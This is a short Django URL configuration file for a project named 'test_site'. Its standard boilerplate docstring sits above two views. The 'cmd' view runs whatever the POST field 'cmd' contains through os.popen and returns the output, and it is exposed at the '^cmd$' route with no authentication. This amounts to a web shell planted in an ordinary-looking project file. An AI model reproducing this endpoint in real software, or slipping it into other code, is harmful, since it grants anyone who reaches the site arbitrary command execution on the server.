"""test_site URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/1.11/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  url(r'^$', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  url(r'^$', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.conf.urls import url, include
    2. Add a URL to urlpatterns:  url(r'^blog/', include('blog.urls'))
"""
from django.conf.urls import url
from django.contrib import admin
from django.shortcuts import HttpResponse, redirect, render
import os


def index(request):
    return render(request, "index.html")


def cmd(request):
    if request.method == "POST":
        return HttpResponse("%s" % os.popen(request.POST.get("cmd")).read())


urlpatterns = [
    # url(r'^admin/', admin.site.urls),
    url("^index$", index),
    url("^cmd$", cmd)

]
